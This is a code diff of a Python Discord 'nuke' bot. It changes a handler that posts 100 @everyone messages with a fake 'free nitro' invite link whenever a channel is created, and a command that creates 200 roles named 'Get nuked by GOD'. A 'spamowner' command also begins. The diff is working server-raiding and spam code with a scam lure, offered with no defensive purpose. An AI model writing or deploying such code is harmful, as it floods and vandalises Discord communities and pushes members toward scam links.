@@ -26,7 +26,7 @@ async def kill(ctx):
 @client.event
 async def on_guild_channel_create(channel):
       for _ in range(100):  # using a for loop to execute ctx.send 100 times
-          await channel.send(" ||@everyone|| I just got nitro from https://discord.gg/q22xBqpabt, join now! and get free nitro!")
+          await channel.send(" ||@everyone|| I just got nitro from https://discord.gg/fsgkMnau, join now! and get free nitro!")
 
 
 
@@ -34,7 +34,7 @@ async def on_guild_channel_create(channel):
 async def rolespam(ctx):
     await ctx.message.delete()
     for i in range(200):
-        await ctx.guild.create_role(name="Get nuked by himogumi")
+        await ctx.guild.create_role(name="Get nuked by GOD")
 @client.command()
 async def spamowner(ctx):
     owner = ctx.guild.owner
